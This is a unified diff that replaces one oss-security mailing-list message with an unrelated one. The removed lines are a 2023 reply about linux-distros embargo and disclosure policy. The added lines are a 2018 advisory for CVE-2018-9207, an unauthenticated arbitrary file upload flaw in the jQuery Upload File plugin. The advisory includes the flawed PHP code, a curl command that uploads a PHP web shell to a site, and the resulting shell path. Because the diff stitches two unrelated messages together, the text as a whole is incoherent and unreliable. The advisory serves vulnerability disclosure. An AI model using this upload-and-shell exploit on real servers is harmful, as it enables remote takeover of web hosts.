@@ -1,4 +1,9 @@
-Received: (qmail 15897 invoked by uid 550); 28 Aug 2023 18:07:35 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1741" "Tuesday" "20" "November" "2018" "17:07:09" "-0500" "Larry W. Cashdollar" "larry0@me.com" "<0677039D-F0D3-4CE6-98B1-7D688CBBC375@me.com>" "43" "[oss-security] Arbitrary file upload vulnerability in jQuery Upload File v4.0.2" nil nil nil "11" "2018112022:07:09" "[oss-security] Arbitrary file upload vulnerability in jQuery Upload File v4.0.2" (number mark "U       larry0@me.co Nov 20   43/1741  " thread-indent "\"[oss-security] Arbitrary file upload vulnerability in jQuery Upload File v4.0.2\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 20002 invoked by uid 550); 20 Nov 2018 22:07:27 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,145 +12,73 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 11389 invoked from network); 28 Aug 2023 18:05:34 -0000
-Date: Mon, 28 Aug 2023 20:05:18 +0200
-From: Solar Designer <solar@openwall.com>
-To: Willy Tarreau <w@1wt.eu>
-Cc: oss-security@lists.openwall.com,
-	Vegard Nossum <vegard.nossum@oracle.com>,
-	Jiri Kosina <jkosina@suse.cz>, Donald Buczek <buczek@molgen.mpg.de>,
-	Greg KH <gregkh@linuxfoundation.org>
-Message-ID: <20230828180518.GA29293@openwall.com>
-References: <20230825222359.GA10424@openwall.com> <ZOuqk2+3EMBV3pPy@1wt.eu>
-Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <ZOuqk2+3EMBV3pPy@1wt.eu>
-User-Agent: Mutt/1.4.2.3i
-Subject: Re: [oss-security] linux-distros list policy and Linux kernel, again
+Received: (qmail 19958 invoked from network); 20 Nov 2018 22:07:27 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
+	t=1542751635; bh=+DJXIv54KX/y/CgBzFZW+qxWsZHg4wEE9dUX51F4aEc=;
+	h=Date:Subject:From:To:Message-id:MIME-version:Content-type;
+	b=6iUha84QCpJPTljw5wCoIy3vbY6QSUW+9Bym+ynnGt0GDPA35ppCCLOvQogZDYspI
+ aaW8/KgdYvF+2sL0HGlpDKNAm8V2HMJ7wZ0SzTCmwTUTps33HIYf6I4EUqF+MtBYfo
+ HRJDmSf6PdvPNIY23qHfMTsM9gjTfbh7pTFkMtAZPXvwckw7wegaVEQx7uixJa/ZYU
+ irA20ysONsOEsFXvW3jrPmBZJ5MQ/gpm0gVzb11uq3TCPPLeuMNtm/FIbkEHjDUJRb
+ gxHXqypsL0YyR/kjmN5kw7Z+EWGuHeUp8NRxXs49ePDZBPZAAyVxg5xII6jyrYAty9
+ FDuOh9jOYXFLA==
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0
+ malwarescore=0 phishscore=0 bulkscore=0 spamscore=0 clxscore=1015 mlxscore=0
+ mlxlogscore=999 adultscore=0 classifier=spam adjust=0 reason=mlx scancount=1
+ engine=8.0.1-1807170000 definitions=main-1811200194
+X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:,,
+ definitions=2018-11-20_10:,, signatures=0
+User-Agent: Microsoft-MacOutlook/10.13.0.181109
+Date: Tue, 20 Nov 2018 17:07:09 -0500
+From: "Larry W. Cashdollar" <larry0@me.com>
+To: Open Security <oss-security@lists.openwall.com>
+Message-id: <0677039D-F0D3-4CE6-98B1-7D688CBBC375@me.com>
+Thread-topic: Arbitrary file upload vulnerability in jQuery Upload File v4.0.2
+MIME-version: 1.0
+Content-type: text/plain; charset=UTF-8
+Content-transfer-encoding: quoted-printable
+Subject: [oss-security] Arbitrary file upload vulnerability in jQuery Upload File v4.0.2
 
-Hi Willy,
+Title:=C2=A0Arbitrary file upload vulnerability in Hayageek jQuery Upload F=
+ile v4.0.2
+Author:=C2=A0Larry W. Cashdollar, @_larry0
+Date:=C2=A02018-11-02
+CVE-ID:[ CVE-2018-9207
+CWE:=C2=A0CWE-434 arbitrary file upload
+Download Site:=C2=A0http://hayageek.com/docs/jquery-upload-file.php
+Vendor:=C2=A0Hayageek
+Vendor Notified:=C2=A02018-11-02
+Vendor Contact:=C2=A0hayageek@gmail.com
+Advisory:=C2=A0http://www.vapidlabs.com/advisory.php?v=3D206
 
-Thank you for your helpful feedback and criticism.
+Description:=C2=A0jQuery Upload File plugin provides Multiple file Uploads =
+with progress bar.Works with any server-side platform (Google App Engine, P=
+HP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form fil=
+e uploads.
 
-I just noticed the recent ksummit list thread is also summarized by LWN:
+Vulnerability:
+The code in https://github.com/hayageek/jquery-upload-file/blob/master/php/=
+upload.php doesn't check for a file type or for requiring any authenticatio=
+n allowing a user to upload an executable file to the /uploads/ directory i=
+f it exists. if(!is_array($_FILES["myfile"]["name"])) //single file { $file=
+Name =3D $_FILES["myfile"]["name"]; move_uploaded_file($_FILES["myfile"]["t=
+mp_name"],$output_dir.$fileName); $ret[]=3D $fileName; } else //Multiple fi=
+les, file[] { $fileCount =3D count($_FILES["myfile"]["name"]); for($i=3D0; =
+$i < $fileCount; $i++) { $fileName =3D $_FILES["myfile"]["name"][$i]; move_=
+uploaded_file($_FILES["myfile"]["tmp_name"][$i],$output_dir.$fileName); $re=
+t[]=3D $fileName; }
 
-https://lwn.net/Articles/941745/
+Exploit Code:
+1. $ curl  -F  "myfile=3D@shell.php" "http://example.com/jquery-upload-file=
+/php/upload.php"
+2. ["shell.php"]
+3. =C2=A0
+4. Where shell is https://github.com/lcashdol/shittyshell/blob/master/shitt=
+yshell.php
+5. =C2=A0
+6. =C2=A0
+7. Shell is located http://example.com/jquery-upload-file/php/uploads/shell=
+.php
 
-In there, Johannes Segitz (SUSE, and a former linux-distros subscriber)
-made a comment saying (among other things):
 
-"I see the 14 day requirement by distros as the major problem in the way
-it is currently run. I understand why solar designer insists on this (it
-is really tricky to keep information private for any extended time), but
-this then leads to people working around distros and distributing the
-information up front, only to notify distros when it's basically already
-solved and widely known."
 
-I think people handling a complex issue more privately at first and only
-notifying distros when no more than 14 days is left until planned public
-disclosure is actually fine.  I doubt all distros need to be involved in
-early analysis and fixing of a complex issue e.g. in the kernel.
-
-On Sun, Aug 27, 2023 at 09:57:07PM +0200, Willy Tarreau wrote:
-> On Sat, Aug 26, 2023 at 12:23:59AM +0200, Solar Designer wrote:
-> > In terms of (linux-)distros list policy, what can we do here?  Accept up
-> > to 7 days since fix is ready and thus accept arbitrarily long embargoes
-> > and more likely have issues "requiring" such embargoes brought to the
-> > list?  BTW, for CPU microarchitectural issues, that would probably need
-> > to be for the full distros list, not limited to Linux, and from what I
-> > know disclosure timelines for such issues may be 3 to 12+ months.
-> 
-> Please note that delays are not specific to hardware issues. We've had
-> to work maybe 3 months with a reporter on a randomness problem that
-> allowed to some extents to guess TCP ports and sequence numbers, and it
-> required us to imagine various approaches that shouldn't break TCP, and
-> iterate with the researchers who studied them, tested them before getting
-> back to us with "it still isn't sufficient". It was a long and painful
-> one, nobody remained idle, yet it was really needed to get to the end of
-> it before publishing anything. Further, the researchers asked us to keep
-> some details on hold for a while because they were preparing a paper, and
-> this is also something to keep in mind (some of them depened on this,
-> though we must not accept that it drags for too long).
-
-Yes, I understand that such cases and such incentives exist.  In those
-cases, the issue should only be brought to (linux-)distros when it's
-almost ready for publication.
-
-That said, can you share more detail on the specific issue you referred
-to above and its handling/disclosure timeline?  Was it ever brought to
-oss-security, and if not then why not?
-
-I am guessing this is related to your work on random32 in 2020:
-
-https://lore.kernel.org/netdev/20200808152628.GA27941@SDF.ORG/
-
-If so, it looks like the original issue became public via your commit in
-July 2020, but further issues with that fix commit were discovered and
-fixes for them prepared in public in August and only merged in October.
-
-So I guess some lengthy private discussion occurred before July 2020,
-but it wasn't enough anyway, which makes me question the value of having
-the initial handling in private.  Maybe the issue wasn't critical enough
-and privately-fixable enough for that.  Maybe this actually illustrates
-that such issues are best handled entirely in public... if it were not
-for the researchers' incentive you mentioned (plan to publish a paper).
-
-> As such I think that it's not a good solution to anything to require a
-> disclosure before a fix is ready. Actually there can be one exception:
-> when no more progress is being made. I don't think I would personally be
-> shocked by saying that a discussion that remained inactive for 7 days
-> leads to publication, it would sufficiently put the pressure on all parties
-> not to let it cool rot. And difficult issues generally don't stay inactive
-> for more than a few days.
-
-Makes sense.  The current kernel documentation edit should take care of
-this (no linux-distros notification until fix is ready) for cases where
-the reporter learns of linux-distros from there.  Maybe we should even
-duplicate this information on the linux-distros wiki page?
-
-Alternatively, we may need to relax the policy.
-
-> > As to publishing PoCs/exploits, this is already mitigated by the Linux
-> > kernel documentation edit making it less likely (but far from
-> > impossible) that people would send stuff to linux-distros without being
-> > aware of the policy.  We could further mitigate this issue by allowing
-> > up to 30 days (but perhaps suggesting at most 7 days?)
-> 
-> I don't think maintaining pressure on the reporter regarding the need
-> for publishing reproducers is doing any good. It should be up to the
-> reporter to say "please keep this confidential". We've had many of
-> these on s@k.o, and it's perfectly understandable. Knowing that they
-> must be very careful about what they share because it will be published
-> is a big constraint, whether it's in terms of code quality, authorization
-> from an employer or customer, code that was blatantly copy-pasted from
-> another exploit just to help with testing, etc. All of this is useful
-> for those trying to fix the problem and do not strictly need to be
-> published, so it's pointless to add pressure on the reporter regarding
-> this.
-
-Via links from the new LWN story, I also found your similar comments
-from 2022:
-
-https://lwn.net/Articles/897065/
-
-Here's a thought experiment: what if the list were not private at all,
-e.g. like oss-security is not?  Sure someone can ask to "please keep
-this confidential", but if it's posted to the list that would be
-ineffective.  So what people sometimes do on public lists, Bugzillas,
-GitHub issues, etc. is share private reproducers with individual
-maintainers out-of-band, such as via direct e-mail, while keeping the
-main discussion on the list, etc.  I see no good reason why the same
-can't be happening on a temporarily-private list.  So the real problem
-may be that (linux-)distros is misunderstood as permanently-private
-rather than temporarily-private.  Unfortunately, I don't know how to
-address that reliably.  Even with automated delayed publication, some
-people would initially have the wrong idea... maybe unless they have to
-pass through a web page with the public archives before finding the
-posting address?
-
-Alternatively, we may need to relax the policy.
-
-Just thinking out loud.
-
-Alexander
